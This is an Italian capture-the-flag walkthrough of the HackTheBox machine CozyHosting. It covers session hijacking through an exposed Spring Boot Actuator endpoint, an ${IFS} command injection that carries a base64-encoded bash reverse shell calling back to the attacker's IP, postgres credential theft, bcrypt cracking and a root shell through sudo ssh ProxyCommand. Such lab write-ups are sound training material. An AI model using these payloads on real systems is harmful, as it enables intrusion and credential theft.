---
title: "CozyHosting Walkthrough"
description: "CozyHosting è una macchina Linux di difficoltà easy che ospita un'applicazione Spring Boot. L'applicazione ha l'endpoint Actuator abilitato. L'enumerazione dell'endpoint porta alla scoperta di un cookie di sessione di un utente, consentendo l'accesso autenticato alla dashboard principale. L'applicazione è vulnerabile a command injection, sfruttata per ottenere una reverse shell sulla macchina remota. Enumerando il file JAR dell'applicazione, vengono scoperte credenziali hardcoded e utilizzate per accedere al database locale. Il database contiene una password hashata, che una volta crackata viene utilizzata per accedere alla macchina come utente josh. L'utente è autorizzato a eseguire ssh come root, permesso sfruttato per ottenere l'escalation completa dei privilegi."
author: dua2z3rr
date: 2025-09-23 2:00:00
categories: [Machines]
tags: ["Area di Interesse: Databases", "Area di Interesse: Injections", "Area di Interesse: Web Application", "Vulnerabilità: OS Command Injection", "Codice: Java", "Codice: Bash", "Servizio: SSH", "Servizio: NGINX", "Servizio: Spring Boot", "Tecnica: User Enumeration", "Tecnica: Fuzzing", "Tecnica: Configuration Analysis", "Tecnica: Password Cracking"]
image: /assets/img/cozyHosting/cozyHosting-resized.png
---
## Enumerazione Esterna

### Nmap

Come sempre iniziamo con uno scan di nmap.

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~]
└──╼ [★]$ sudo nmap 10.10.11.230 -vv -p-
<SNIP>
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

<SNIP>

┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~]
└──╼ [★]$ sudo nmap 10.10.11.230 -vv -p 22,80 -sC -sV
<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEpNwlByWMKMm7ZgDWRW+WZ9uHc/0Ehct692T5VBBGaWhA71L+yFgM/SqhtUoy0bO8otHbpy3bPBFtmjqQPsbC8=
|   256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHVzF8iMVIHgp9xMX9qxvbaoXVg1xkGLo61jXuUAYq5q
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Non otteniamo informazioni molto importanti dalle flag **-sV** e **-sC**.

### HTTP

Andiamo sul sito dopo aver aggiunto **cozyhosting.htb** sul file **/etc/hosts**

![Desktop View](/assets/img/cozyHosting/cozyHosting-home-page.png)

In fondo alla home page vediamo che è stato utilizzato **SpringBoot** per la realizzazione del sito.

![Desktop View](/assets/img/cozyHosting/cozyHosting-made-by.png)

### FFUF

Con ffuf possiamo enumerare le directory esistenti.

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://cozyhosting.htb/FUZZ -recursion -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login                   [Status: 200, Size: 4431, Words: 1718, Lines: 97, Duration: 41ms]
index                   [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 46ms]
                        [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 53ms]
admin                   [Status: 401, Size: 97, Words: 1, Lines: 1, Duration: 32ms]
logout                  [Status: 204, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 11ms]
                        [Status: 200, Size: 12706, Words: 4263, Lines: 285, Duration: 20ms]
27079%5Fclassicpeople2%2Ejpg [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
children%2527s_tent     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 8ms]
tiki%2Epng              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
Wanted%2e%2e%2e         [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 27ms]
How_to%2e%2e%2e         [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
squishdot_rss10%2Etxt   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 267ms]
b33p%2Ehtml             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 35ms]
help%2523drupal         [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 10ms]
:: Progress: [220547/220547] :: Job [1/1] :: 357 req/sec :: Duration: [0:10:41] :: Errors: 0 ::
```

La pagina di login sembra un punto d'accesso ma OS command execution non funziona.

Proviamo a fare fuzzing con una wordlist apposta per spring boot.

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~]
└──╼ [★]$ ffuf -w spring-boot.txt:FUZZ -u http://cozyhosting.htb/FUZZ -recursion -ic

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cozyhosting.htb/FUZZ
 :: Wordlist         : FUZZ: /home/dua2z3rr/spring-boot.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

actuator                [Status: 200, Size: 634, Words: 1, Lines: 1, Duration: 190ms]
actuator/env/path       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 213ms]
actuator/env            [Status: 200, Size: 4957, Words: 120, Lines: 1, Duration: 236ms]
actuator/env/home       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 244ms]
actuator/sessions       [Status: 200, Size: 98, Words: 1, Lines: 1, Duration: 176ms]
actuator/env/lang       [Status: 200, Size: 487, Words: 13, Lines: 1, Duration: 229ms]
actuator/health         [Status: 200, Size: 15, Words: 1, Lines: 1, Duration: 268ms]
actuator/mappings       [Status: 200, Size: 9938, Words: 108, Lines: 1, Duration: 275ms]
actuator/beans          [Status: 200, Size: 127224, Words: 542, Lines: 1, Duration: 298ms]
:: Progress: [112/112] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Sembra che l'endpoint **actuator** non sia stato rimosso. visitiamo queste pagine.

### Enumerazione Actuator

Enumerando le directory scoperte tramite ffuf, troviamo qualcosa di interessante su **/actuator/sessions**:

![Desktop View](/assets/img/cozyHosting/cozyHosting-actuator-sessions.png)

Possiamo utilizzare la sessione di **kanderson**, che probilmente è il developer, e che ha utilizzato per debuggare la sua web app.

Torniamo sulla pagina **/login**. Analizzando la richiesta tramite burp suite, vediamo il campo **JSESSIONID**. utilizziamo l'ID della sessione di **kanderson** per tutte le richieste.

Visto che le richiesta su cui bisogna modificare il cookie sono più di 20, ci conviene utilizzare la modalità match and replace di burp suite, come mostrato nella immagine sotto.

![Desktop View](/assets/img/cozyHosting/cozyHosting-match-and-replace.png)

Tornando sul browser, ci ritroviamo sulla dashboard.

![Desktop View](/assets/img/cozyHosting/cozyHosting-dashboard.png)

In fondo alla dashboard troviamo un modo per collegarsi a degli host. A quanto pare sembra che il comando usato sia `ssh -i id_rsa username@hostname`. 

![Desktop View](/assets/img/cozyHosting/cozyHosting-injection.png)

Possiamo fare una command injection nel campo hostname grazie alla variabile ${IFS} della shell.

> La variabile ${IFS} della shell è un separatore. La usiamo per sostituire gli spazi vuoti quando non ci è permesso.
{: .prompt-tip }

Utilizzando come hostname questa stringa:
`;echo${IFS}"L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjQvNDQ0NCAwPiYx"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;`
Possiamo ottenre una reverse shell sulla macchina che hosta il sito fatto con spring boot.

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~]
└──╼ [★]$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.11.230] 56502
bash: cannot set terminal process group (1060): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app
```

Non possiamo ancora prendere la user flag. Dobbiamo fare lateral movement e diventare lo user **john**.

## Lateral Movement

### Enumerazione Spring Boot

Appena otteniamo la reverse shell ci ritroviamo con un file jar nella cartella dove ci troviamo. Questo file si chiama **cloudhosting-0.0.1.jar** ed è la applicazione web spring boot.

```shell
app@cozyhosting:/app$ ls -al
ls -al
total 58856
drwxr-xr-x  2 root root     4096 Aug 14  2023 .
drwxr-xr-x 19 root root     4096 Aug 14  2023 ..
-rw-r--r--  1 root root 60259688 Aug 11  2023 cloudhosting-0.0.1.jar
```

Unzippiamo questa cartella nella cartella **tmp** dopo aver ottenuto una **full tty** attraverso il comando `script /dev/null -c bash`.

Enumeriamo ora la cartella.

> per semplicità, possiamo aprire un http server con python (`python3 -m http.server`) e trasferire la cartella sulla nostra macchina.
{: .prompt-info }

Ecco i file contenuti nel file jar:

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~/10.10.11.230:8000]
└──╼ [★]$ tree .
.
└── app
    ├── BOOT-INF
    │   ├── classes
    │   │   ├── application.properties
    │   │   ├── htb
    │   │   │   ├── cloudhosting
    │   │   │   │   ├── compliance
    │   │   │   │   │   └── index.html
    │   │   │   │   ├── CozyHostingApp.class
    │   │   │   │   ├── database
    │   │   │   │   │   └── index.html
    │   │   │   │   ├── exception
    │   │   │   │   │   └── index.html
    │   │   │   │   ├── index.html
    │   │   │   │   ├── MvcConfig.class
    │   │   │   │   ├── scheduled
    │   │   │   │   │   └── index.html
    │   │   │   │   └── secutiry
    │   │   │   │       └── index.html
    │   │   │   └── index.html
    │   │   ├── index.html
    │   │   ├── static
    │   │   │   ├── assets
    │   │   │   │   ├── css
    │   │   │   │   │   └── index.html
    │   │   │   │   ├── img
    │   │   │   │   │   └── index.html
    │   │   │   │   ├── index.html
    │   │   │   │   ├── js
    │   │   │   │   │   └── index.html
    │   │   │   │   └── vendor
    │   │   │   │       └── index.html
    │   │   │   └── index.html
    │   │   └── templates
    │   │       └── index.html
    │   ├── classpath.idx
    │   ├── index.html
    │   ├── layers.idx
    │   └── lib
    │       ├── angus-activation-1.0.0.jar
    │       ├── antlr4-runtime-4.10.1.jar
    │       ├── aspectjweaver-1.9.19.jar
    │       ├── attoparser-2.0.6.RELEASE.jar
    │       ├── byte-buddy-1.12.22.jar
    │       ├── checker-qual-3.5.0.jar
    │       ├── classmate-1.5.1.jar
    │       ├── HdrHistogram-2.1.12.jar
    │       ├── hibernate-commons-annotations-6.0.2.Final.jar
    │       ├── hibernate-core-6.1.6.Final.jar
    │       ├── HikariCP-5.0.1.jar
    │       ├── index.html
    │       ├── istack-commons-runtime-4.1.1.jar
    │       ├── jackson-annotations-2.14.1.jar
    │       ├── jackson-core-2.14.1.jar
    │       ├── jackson-databind-2.14.1.jar
    │       ├── jackson-datatype-jdk8-2.14.1.jar
    │       ├── jackson-datatype-jsr310-2.14.1.jar
    │       ├── jackson-module-parameter-names-2.14.1.jar
    │       ├── jakarta.activation-api-2.1.1.jar
    │       ├── jakarta.annotation-api-2.1.1.jar
    │       ├── jakarta.inject-api-2.0.0.jar
    │       ├── jakarta.persistence-api-3.1.0.jar
    │       ├── jakarta.transaction-api-2.0.1.jar
    │       ├── jakarta.xml.bind-api-4.0.0.jar
    │       ├── jandex-2.4.2.Final.jar
    │       ├── jaxb-core-4.0.1.jar
    │       ├── jaxb-runtime-4.0.1.jar
    │       ├── jboss-logging-3.5.0.Final.jar
    │       ├── jul-to-slf4j-2.0.6.jar
    │       ├── LatencyUtils-2.0.3.jar
    │       ├── log4j-api-2.19.0.jar
    │       ├── log4j-to-slf4j-2.19.0.jar
    │       ├── logback-classic-1.4.5.jar
    │       ├── logback-core-1.4.5.jar
    │       ├── lombok-1.18.26.jar
    │       ├── micrometer-commons-1.10.3.jar
    │       ├── micrometer-core-1.10.3.jar
    │       ├── micrometer-observation-1.10.3.jar
    │       ├── postgresql-42.5.1.jar
    │       ├── slf4j-api-2.0.6.jar
    │       ├── snakeyaml-1.33.jar
    │       ├── spring-aop-6.0.4.jar
    │       ├── spring-aspects-6.0.4.jar
    │       ├── spring-beans-6.0.4.jar
    │       ├── spring-boot-3.0.2.jar
    │       ├── spring-boot-actuator-3.0.2.jar
    │       ├── spring-boot-actuator-autoconfigure-3.0.2.jar
    │       ├── spring-boot-autoconfigure-3.0.2.jar
    │       ├── spring-boot-jarmode-layertools-3.0.2.jar
    │       ├── spring-context-6.0.4.jar
    │       ├── spring-core-6.0.4.jar
    │       ├── spring-data-commons-3.0.1.jar
    │       ├── spring-data-jpa-3.0.1.jar
    │       ├── spring-expression-6.0.4.jar
    │       ├── spring-jcl-6.0.4.jar
    │       ├── spring-jdbc-6.0.4.jar
    │       ├── spring-orm-6.0.4.jar
    │       ├── spring-security-config-6.0.1.jar
    │       ├── spring-security-core-6.0.1.jar
    │       ├── spring-security-crypto-6.0.1.jar
    │       ├── spring-security-web-6.0.1.jar
    │       ├── spring-session-core-3.0.0.jar
    │       ├── spring-tx-6.0.4.jar
    │       ├── spring-web-6.0.4.jar
    │       ├── spring-webmvc-6.0.4.jar
    │       ├── thymeleaf-3.1.1.RELEASE.jar
    │       ├── thymeleaf-extras-springsecurity6-3.1.1.RELEASE.jar
    │       ├── thymeleaf-spring6-3.1.1.RELEASE.jar
    │       ├── tomcat-embed-core-10.1.5.jar
    │       ├── tomcat-embed-el-10.1.5.jar
    │       ├── tomcat-embed-websocket-10.1.5.jar
    │       ├── txw2-4.0.1.jar
    │       └── unbescape-1.1.6.RELEASE.jar
    ├── index.html
    ├── META-INF
    │   ├── index.html
    │   ├── MANIFEST.MF
    │   └── maven
    │       ├── htb.cloudhosting
    │       │   ├── cloudhosting
    │       │   │   ├── index.html
    │       │   │   ├── pom.properties
    │       │   │   └── pom.xml
    │       │   └── index.html
    │       └── index.html
    └── org
        ├── index.html
        └── springframework
            ├── boot
            │   ├── index.html
            │   └── loader
            │       ├── archive
            │       │   └── index.html
            │       ├── ClassPathIndexFile.class
            │       ├── data
            │       │   └── index.html
            │       ├── ExecutableArchiveLauncher.class
            │       ├── index.html
            │       ├── jar
            │       │   └── index.html
            │       ├── JarLauncher.class
            │       ├── jarmode
            │       │   └── index.html
            │       ├── LaunchedURLClassLoader$DefinePackageCallType.class
            │       ├── LaunchedURLClassLoader$UseFastConnectionExceptionsEnumeration.class
            │       ├── LaunchedURLClassLoader.class
            │       ├── Launcher.class
            │       ├── MainMethodRunner.class
            │       ├── PropertiesLauncher$ArchiveEntryFilter.class
            │       ├── PropertiesLauncher$ClassPathArchives.class
            │       ├── PropertiesLauncher$PrefixMatchingArchiveFilter.class
            │       ├── PropertiesLauncher.class
            │       ├── util
            │       │   └── index.html
            │       └── WarLauncher.class
            └── index.html

32 directories, 125 files
```

> Ignoriamo i file **index.html** creati da wget. 
{: .prompt-attention }

Sul file **application.properties** otteniamo la password del database postgres.

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~/10.10.11.230:8000/app/BOOT-INF/classes]
└──╼ [★]$ cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Allora usiamo sulla macchina nemica:

```shell
app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR

psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

### Enumerazione Postgres

```text
\list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

Scegliamo il db **cozyhosting** e connettiamoci. Poi usiamo il comando `\dt` per elencare tutte le tables.

```text
\connect cozyhosting
You are now connected to database "cozyhosting" as user "postgres".

\dt
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

Leggiamo la tabella degli utenti. Potremmo trovare degli hash da crackare per lateral movement.

```text
SELECT * FROM users;
   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

### Cracking Hashes with Hashcat

Usiamo **hashid** per capire la modalità da usare in hashcat.

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~/10.10.11.230:8000/app/BOOT-INF/classes]
└──╼ [★]$ hashid -m hash
--File 'hash'--
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'hash'--
```

Proviamo con ciascuno partendo dal primo.

```shell
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~]
└──╼ [★]$ hashcat -a 0 -m 3200 hash rock.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-skylake-avx512-AMD EPYC 9575F 64-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 9575F 64-Core Processor, 3922/7908 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: rock.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
Time.Started.....: Tue Sep 23 08:15:14 2025 (37 secs)
Time.Estimated...: Tue Sep 23 08:15:51 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rock.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:       74 H/s (3.24ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2800/14344385 (0.02%)
Rejected.........: 0/2800 (0.00%)
Restore.Point....: 2784/14344385 (0.02%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#2....: meagan -> j123456

Started: Tue Sep 23 08:15:00 2025
Stopped: Tue Sep 23 08:15:53 2025
┌─[eu-vip-21]─[10.10.14.4]─[dua2z3rr@htb-gwqf776wqo]─[~]
└──╼ [★]$ hashcat -a 0 -m 3200 hash rock.txt --show
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

La password è **manchesterunited** ! Accediamo tramite ssh come root. (La wordlist utilizzata sopra è **rockyou.txt**)

## Shell come Josh

Sfortunatamente, l'ultima passowrd è di josh, e non di root. Adesso ci tocca fare una privilege escalation per ottenere la root flag.

Prendiamo la user flag.

```shell
josh@cozyhosting:~$ ls
user.txt
```

### Privilege Escalation

Come usanza, usiamo `sudo -l` per vedere se ci sono dei binary che possiamo eseguire come root.

```shell
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Andiamo su **GTFOBins** e cerchiamo ssh. Troviamo questo comando, testiamo se funziona: 

```shell
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
```

Funziona! Terminiamo così la box, prendendo la root flag.
